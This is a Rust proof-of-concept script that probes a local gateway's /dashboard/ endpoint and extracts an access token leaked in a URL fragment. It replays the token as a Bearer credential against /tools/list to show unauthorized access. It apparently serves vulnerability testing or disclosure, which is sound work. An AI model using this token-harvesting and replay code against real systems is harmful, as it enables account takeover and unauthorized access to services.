// F1.rs — Dashboard Fragment Token Leak Proof

use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

const HOST: &str = "127.0.0.1";
const PORT: u16 = 18789;

fn http(req: &str) -> String {
    let mut s = TcpStream::connect((HOST, PORT)).expect("connect to gateway");
    s.set_read_timeout(Some(Duration::from_secs(10))).unwrap();
    s.write_all(req.as_bytes()).unwrap();
    let mut buf = String::new();
    let _ = s.read_to_string(&mut buf);
    buf
}

fn status(resp: &str) -> u16 {
    resp.lines().next().and_then(|l| l.split_whitespace().nth(1))
        .and_then(|c| c.parse().ok()).unwrap_or(0)
}

fn fragment_token(url: &str) -> Option<String> {
    let frag = url.split('#').nth(1)?;
    for kv in frag.split('&') {
        let (k, v) = kv.split_once('=').unwrap_or((kv, ""));
        if k == "token" || k == "access_token" {
            return Some(v.to_string());
        }
    }
    None
}

fn main() {
    println!("[*] F1: Dashboard Fragment Token Leak Proof");
    let boot = http(&format!("GET /dashboard/ HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nConnection: close\r\n\r\n"));
    let leaked_url = boot.lines()
        .find(|l| l.to_ascii_lowercase().starts_with("location:") && l.contains('#'))
        .map(|l| l.split('#').next_back().map(|f| format!("#{f}")).unwrap_or_default())
        .or_else(|| {
            let b = &boot;
            let i = b.find("#/dash?token=").or_else(|| b.find("#access_token="))?;
            let end = b[i..].find(|c: char| c == '"' || c == '\'' || c == '<').map(|e| i + e).unwrap_or(b.len());
            Some(b[i..end].to_string())
        });
    let Some(url) = leaked_url else { eprintln!("[!] NO PROOF: no fragment URL"); std::process::exit(1); };
    let Some(token) = fragment_token(&url) else { eprintln!("[!] NO PROOF: no token in fragment"); std::process::exit(1); };
    let resp = http(&format!("GET /tools/list HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nAuthorization: Bearer {token}\r\nConnection: close\r\n\r\n"));
    let code = status(&resp);
    println!("[+] Token replay result: {code}");
    if code != 401 && code != 0 {
        println!("[+] PROOF: fragment token grants full gateway access");
    } else {
        eprintln!("[!] NO PROOF: token rejected");
        std::process::exit(1);
    }
}
